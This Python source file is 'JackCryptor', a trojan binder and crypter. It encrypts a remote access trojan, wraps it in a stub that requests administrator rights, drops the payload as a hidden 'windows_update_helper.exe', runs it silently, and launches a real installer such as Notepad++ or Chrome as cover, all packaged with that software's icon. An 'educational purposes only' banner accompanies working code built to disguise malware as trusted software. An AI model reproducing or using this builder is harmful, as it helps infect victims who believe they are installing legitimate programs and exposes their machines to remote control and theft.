#!/usr/bin/env python3
"""
JackCryptor - Advanced Payload Bundle Creator
Educational Purposes Only - Use Responsibly
"""

import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path
import ctypes
import time
import base64

# Try to import Crypto modules with fallbacks
CRYPTO_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    # Fallback to simple encryption
    pass

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║    ██╗ █████╗  ██████╗██╗  ██╗ ██████╗█████╗ ██╗   ██╗  ║
║    ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚██╗ ██╔╝  ║
║    ██║███████║██║     █████╔╝ ██║     ███████║ ╚████╔╝   ║
║    ██║██╔══██║██║     ██╔═██╗ ██║     ██╔══██║  ╚██╔╝    ║
║    ██║██║  ██║╚██████╗██║  ██╗╚██████╗██║  ██║   ██║     ║
║    ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝     ║
║                                                          ║
║    {Colors.CYAN}Advanced Payload Bundle Creator{Colors.PURPLE}                 ║
║    {Colors.RED}       FOR EDUCATIONAL PURPOSES ONLY{Colors.PURPLE}            ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def print_status(message):
    print(f"{Colors.BOLD}{Colors.BLUE}[*]{Colors.RESET} {message}")

def print_success(message):
    print(f"{Colors.BOLD}{Colors.GREEN}[+]{Colors.RESET} {message}")

def print_warning(message):
    print(f"{Colors.BOLD}{Colors.YELLOW}[!]{Colors.RESET} {message}")

def print_error(message):
    print(f"{Colors.BOLD}{Colors.RED}[-]{Colors.RESET} {message}")

def print_info(message):
    print(f"{Colors.BOLD}{Colors.CYAN}[i]{Colors.RESET} {message}")

def print_step(step, message):
    print(f"{Colors.BOLD}{Colors.PURPLE}[{step}]{Colors.RESET} {message}")

def get_user_choice(options, prompt):
    """Get user choice from a list of options"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{prompt}{Colors.RESET}")
    for i, option in enumerate(options, 1):
        print(f"{Colors.YELLOW}{i}.{Colors.RESET} {option}")
    
    while True:
        try:
            choice = int(input(f"\n{Colors.BOLD}{Colors.WHITE}Enter your choice (number): {Colors.RESET}"))
            if 1 <= choice <= len(options):
                return options[choice-1], choice
            else:
                print_error("Invalid choice. Please try again.")
        except ValueError:
            print_error("Please enter a number.")

def get_available_icons():
    """Get list of available icons in the icons folder"""
    icon_dir = Path("icons")
    if icon_dir.exists():
        return [f.stem for f in icon_dir.glob("*.ico")]
    return []

def get_available_installers():
    """Get list of available installers in the installers folder"""
    installer_dir = Path("installers")
    if installer_dir.exists():
        exe_files = [f.stem for f in installer_dir.glob("*.exe")]
        msi_files = [f.stem for f in installer_dir.glob("*.msi")]
        return exe_files + msi_files
    return ["notepad++", "vlc", "chrome", "firefox", "winrar", "java", "adobe", "spotify"]

class SimpleCrypter:
    """Fallback encryption if PyCryptodome is not available"""
    def __init__(self, key=None):
        if key is None:
            key = os.urandom(32)
        self.key = key
        self.iv = os.urandom(16)
    
    def xor_data(self, data, key):
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def encrypt_data(self, data):
        # Simple XOR encryption with IV
        encrypted = self.iv + self.xor_data(data, self.key)
        return encrypted
    
    def decrypt_data(self, encrypted_data):
        iv = encrypted_data[:16]
        actual_data = encrypted_data[16:]
        return self.xor_data(actual_data, self.key)

class CustomCrypter:
    def __init__(self, key=None):
        if CRYPTO_AVAILABLE:
            self.key = key or get_random_bytes(32)
            self.iv = get_random_bytes(16)
        else:
            self.key = key or os.urandom(32)
            self.iv = os.urandom(16)
    
    def encrypt_data(self, data):
        if CRYPTO_AVAILABLE:
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            padded_data = pad(data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            return self.iv + encrypted_data
        else:
            # Fallback to simple XOR encryption
            simple = SimpleCrypter(self.key)
            return simple.encrypt_data(data)
    
    def decrypt_data(self, encrypted_data):
        if CRYPTO_AVAILABLE:
            iv = encrypted_data[:16]
            actual_data = encrypted_data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted_data = cipher.decrypt(actual_data)
            return unpad(decrypted_data, AES.block_size)
        else:
            # Fallback to simple XOR decryption
            simple = SimpleCrypter(self.key)
            return simple.decrypt_data(encrypted_data)
    
    def encrypt_file(self, input_path, output_path):
        with open(input_path, 'rb') as f:
            plaintext = f.read()
        encrypted_data = self.encrypt_data(plaintext)
        with open(output_path, 'wb') as f:
            f.write(encrypted_data)

class BundleCreator:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="bundle_")
        self.work_dir = Path(self.temp_dir)
        self.crypter = CustomCrypter()
        self.encrypted_payload = b''
        
    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    def get_local_software(self, software_type):
        """Get local software installer if available"""
        installer_dir = Path("installers")
        possible_files = [
            installer_dir / f"{software_type}.exe",
            installer_dir / f"{software_type}.msi",
            installer_dir / f"{software_type}_installer.exe",
            installer_dir / f"{software_type}Installer.exe"
        ]
        
        for file_path in possible_files:
            if file_path.exists():
                print_success(f"Using local installer: {file_path}")
                return file_path
        
        print_warning(f"No local installer found for {software_type}")
        return None

    def get_local_icon(self, software_type):
        """Get local icon if available"""
        icon_dir = Path("icons")
        icon_path = icon_dir / f"{software_type}.ico"
        
        if icon_path.exists():
            print_success(f"Using local icon: {icon_path}")
            return icon_path
        
        # Try to find any icon
        ico_files = list(icon_dir.glob("*.ico"))
        if ico_files:
            return ico_files[0]
        
        print_warning(f"No local icon found for {software_type}")
        return None

    def create_stub_script(self, software_type):
        # Convert encrypted payload to base64 for easier embedding
        encrypted_payload_b64 = base64.b64encode(self.encrypted_payload).decode('utf-8')
        
        stub_code = f'''#!/usr/bin/env python3
import os
import sys
import tempfile
import subprocess
import ctypes
import time
from pathlib import Path
import base64

# Encrypted payload data (base64 encoded)
ENCRYPTED_PAYLOAD_B64 = "{encrypted_payload_b64}"

class Decrypter:
    def __init__(self, key):
        self.key = key
    
    def decrypt_data(self, encrypted_data):
        try:
            # Try to use PyCryptodome if available
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            iv = encrypted_data[:16]
            actual_data = encrypted_data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted_data = cipher.decrypt(actual_data)
            return unpad(decrypted_data, AES.block_size)
        except ImportError:
            # Fallback to simple XOR decryption
            iv = encrypted_data[:16]
            actual_data = encrypted_data[16:]
            return bytes([actual_data[i] ^ self.key[i % len(self.key)] for i in range(len(actual_data))])
        except Exception:
            # Final fallback - just return the data without IV
            return encrypted_data[16:]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    # Try to get admin privileges
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            time.sleep(2)
            sys.exit(0)
        except:
            pass
    
    key = {repr(self.crypter.key)}
    decrypter = Decrypter(key)
    
    try:
        # Decode and decrypt the payload
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD_B64)
        decrypted_data = decrypter.decrypt_data(encrypted_data)
        
        # Write to temp directory
        temp_dir = tempfile.gettempdir()
        payload_path = str(Path(temp_dir) / "windows_update_helper.exe")
        
        with open(payload_path, 'wb') as f:
            f.write(decrypted_data)
        
        # Hide the file
        try:
            ctypes.windll.kernel32.SetFileAttributesW(payload_path, 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
        
        # Execute the payload
        subprocess.Popen(
            [payload_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            shell=False
        )
        
        # Execute the legitimate installer if available
        try:
            legit_installer_path = os.path.join(os.path.dirname(sys.argv[0]), "{software_type}_installer.exe")
            if os.path.exists(legit_installer_path):
                subprocess.Popen(
                    [legit_installer_path, "/S", "/quiet", "/norestart"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    shell=False
                )
        except:
            pass
        
        # Clean up after some time
        time.sleep(5)
        try:
            os.remove(payload_path)
        except:
            pass
            
    except Exception as e:
        # Silent fail - don't alert the user
        pass

if __name__ == "__main__":
    main()
'''
        return stub_code

    def build_bundle(self, rat_path, software_type="notepad++", output_name=None, icon_path=None):
        try:
            if not output_name:
                output_name = f"{software_type.capitalize()}_Installer.exe"
            
            if not os.path.exists(rat_path):
                print_error(f"RAT file not found: {rat_path}")
                return False
            
            # Use local software if available
            legit_path = self.get_local_software(software_type)
            
            # Copy installer to temp directory if available
            temp_installer_path = None
            if legit_path:
                temp_installer_path = self.work_dir / legit_path.name
                shutil.copy2(legit_path, temp_installer_path)
            
            # Use local icon if available
            final_icon_path = None
            local_icon = self.get_local_icon(software_type)
            if local_icon:
                final_icon_path = local_icon
                print_success(f"Using icon: {final_icon_path}")
            elif icon_path and os.path.exists(icon_path):
                final_icon_path = Path(icon_path)
                print_success(f"Using custom icon: {final_icon_path}")
            
            # Copy icon to temp directory if using local icon
            temp_icon_path = None
            if final_icon_path and final_icon_path.exists():
                temp_icon_path = self.work_dir / final_icon_path.name
                shutil.copy2(final_icon_path, temp_icon_path)
            
            # Encrypt RAT payload
            print_status("Encrypting RAT payload...")
            encrypted_rat_path = self.work_dir / "encrypted_rat.bin"
            self.crypter.encrypt_file(rat_path, encrypted_rat_path)
            
            # Read encrypted payload
            with open(encrypted_rat_path, 'rb') as f:
                self.encrypted_payload = f.read()
            
            # Create stub with actual payload
            stub_code = self.create_stub_script(software_type)
            
            stub_path = self.work_dir / "stub.py"
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)
            
            # Build with PyInstaller
            print_status("Building executable with PyInstaller...")
            
            # Prepare PyInstaller command
            build_cmd = [
                sys.executable, 
                "-m", 
                "PyInstaller", 
                "--onefile",
                "--noconsole",
                "--name", output_name,
            ]
            
            # Add icon if available
            if temp_icon_path and temp_icon_path.exists():
                build_cmd.extend(['--icon', str(temp_icon_path)])
            
            # Add installer if available
            if temp_installer_path and temp_installer_path.exists():
                build_cmd.extend(['--add-data', f'{temp_installer_path};.'])
            
            build_cmd.append(str(stub_path))
            
            # Run PyInstaller
            result = subprocess.run(build_cmd, cwd=self.work_dir, capture_output=True, text=True)
            
            if result.returncode != 0:
                print_error("Build failed!")
                print_error(result.stderr)
                return False
            
            # Move final executable
            dist_path = self.work_dir / "dist" / output_name
            if dist_path.exists():
                final_path = Path.cwd() / output_name
                
                # Remove if already exists
                if final_path.exists():
                    os.remove(final_path)
                
                shutil.move(str(dist_path), str(final_path))
                
                # Show file information
                file_size = os.path.getsize(final_path) / (1024 * 1024)
                
                print_success(f"Bundle created successfully: {final_path}")
                print_info(f"File size: {file_size:.2f} MB")
                print_info(f"Software: {software_type}")
                print_info("Icon: Included" if final_icon_path else "Icon: Default")
                if CRYPTO_AVAILABLE:
                    print_info("Encryption: AES-256-CBC")
                else:
                    print_info("Encryption: XOR (PyCryptodome not available)")
                
                return True
            else:
                print_error("Output file not found in dist directory")
                return False
                
        except Exception as e:
            print_error(f"Error: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            self.cleanup()

def main():
    print_banner()
    
    # Check if required modules are installed
    if not CRYPTO_AVAILABLE:
        print_warning("PyCryptodome is not available. Using fallback encryption.")
        install = input(f"{Colors.BOLD}{Colors.WHITE}Install PyCryptodome for better encryption? (Y/n): {Colors.RESET}").strip().lower()
        if install != 'n':
            print_status("Installing PyCryptodome...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
            # Restart the script to use the installed module
            print_info("Please restart the script to use PyCryptodome encryption.")
            return
    
    try:
        import PyInstaller
    except ImportError:
        print_error("PyInstaller is not installed. Installing now...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Check folder structure
    if not Path("icons").exists():
        print_warning("Icons folder not found. Creating...")
        os.makedirs("icons", exist_ok=True)
    
    if not Path("installers").exists():
        print_warning("Installers folder not found. Creating...")
        os.makedirs("installers", exist_ok=True)
        print_info("Please add some legitimate installers to the 'installers' folder")
        return
    
    # Get available options
    available_installers = get_available_installers()
    available_icons = get_available_icons()
    
    if not available_installers:
        print_error("No installers found in 'installers' folder!")
        print_info("Please add some .exe or .msi files to the installers folder")
        return
    
    print_step("1", "Software Selection")
    software_type, choice = get_user_choice(available_installers, "Select software to bundle with:")
    
    print_step("2", "Output Configuration")
    default_name = f"{software_type}_Installer.exe"
    output_name = input(f"\n{Colors.BOLD}{Colors.WHITE}Enter output filename (or press Enter for '{default_name}'): {Colors.RESET}").strip()
    if not output_name:
        output_name = default_name
    elif not output_name.endswith('.exe'):
        output_name += '.exe'
    
    print_step("3", "Icon Selection")
    icon_path = None
    if available_icons:
        options = available_icons + ["Custom path", "Skip"]
        icon_choice, _ = get_user_choice(options, "Select an icon:")
        if icon_choice != "Custom path" and icon_choice != "Skip":
            icon_path = f"icons/{icon_choice}.ico"
        elif icon_choice == "Custom path":
            icon_path = input(f"{Colors.BOLD}{Colors.WHITE}Enter path to .ico file: {Colors.RESET}").strip()
            if icon_path and not os.path.exists(icon_path):
                print_warning("Icon file not found. Using default icon.")
                icon_path = None
    else:
        print_warning("No icons found in icons folder.")
        use_custom = input(f"{Colors.BOLD}{Colors.WHITE}Use custom icon? (y/N): {Colors.RESET}").strip().lower()
        if use_custom == 'y':
            icon_path = input(f"{Colors.BOLD}{Colors.WHITE}Enter path to .ico file: {Colors.RESET}").strip()
            if icon_path and not os.path.exists(icon_path):
                print_warning("Icon file not found. Using default icon.")
                icon_path = None
    
    print_step("4", "Payload Configuration")
    rat_path = None
    if len(sys.argv) > 1:
        rat_path = sys.argv[1]
        if not os.path.exists(rat_path):
            print_error(f"RAT file not found: {rat_path}")
            rat_path = None
    
    if not rat_path:
        # Look for common RAT filenames
        possible_rats = ["Client.exe", "client.exe", "payload.exe", "rat.exe", "njrat.exe"]
        for rat in possible_rats:
            if os.path.exists(rat):
                rat_path = rat
                print_info(f"Found RAT file: {rat_path}")
                break
        
        if not rat_path:
            rat_path = input(f"{Colors.BOLD}{Colors.WHITE}Enter path to RAT executable: {Colors.RESET}").strip()
    
    if not os.path.exists(rat_path):
        print_error(f"RAT file not found: {rat_path}")
        return
    
    # Confirm choices
    print(f"\n{Colors.BOLD}{Colors.PURPLE}╔══════════════════════════════════════════════════╗")
    print(f"║               CONFIGURATION SUMMARY              ║")
    print(f"╚══════════════════════════════════════════════════╝{Colors.RESET}")
    print(f"{Colors.CYAN}RAT File:{Colors.RESET} {rat_path}")
    print(f"{Colors.CYAN}Software:{Colors.RESET} {software_type}")
    print(f"{Colors.CYAN}Output:{Colors.RESET} {output_name}")
    print(f"{Colors.CYAN}Icon:{Colors.RESET} {icon_path if icon_path else 'Default'}")
    if CRYPTO_AVAILABLE:
        print(f"{Colors.CYAN}Encryption:{Colors.RESET} AES-256-CBC")
    else:
        print(f"{Colors.CYAN}Encryption:{Colors.RESET} XOR (Fallback)")
    
    confirm = input(f"\n{Colors.BOLD}{Colors.WHITE}Proceed with build? (Y/n): {Colors.RESET}").strip().lower()
    if confirm == 'n':
        print("Build cancelled.")
        return
    
    print_step("5", "Building Bundle")
    creator = BundleCreator()
    success = creator.build_bundle(rat_path, software_type, output_name, icon_path)
    
    if success:
        print_success("Build completed successfully!")
        print_warning("FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    else:
        print_error("Build failed!")

if __name__ == "__main__":
    main()